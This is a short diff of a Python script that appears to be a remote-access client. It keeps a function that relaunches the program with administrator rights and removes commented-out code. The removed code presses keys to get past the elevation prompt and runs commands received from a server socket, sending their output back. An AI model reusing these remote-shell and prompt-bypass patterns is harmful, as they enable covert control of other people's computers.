@@ -126,26 +126,6 @@ def main():
 
     def get_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        """print("Clicking left")
-        pyautogui.press('left')
-        print("Clicking enter")
-        pyautogui.press('enter')
-        print("Done")"""
-        
-        pyautogui.press(['command'])
-        time.sleep(5)
-        print("Done")
-
-
-        """#TODO: Remove this is if it not used, because it was only a test.
-        print("Receiving cmd_command form the server")
-        command = s.recv(10000).decode()
-        print("Executing the command")
-        output = os.system(command)
-        print("Sending output back to the server")
-        s.send(output.encode())
-        """
-    
 
     while True:
         #try:
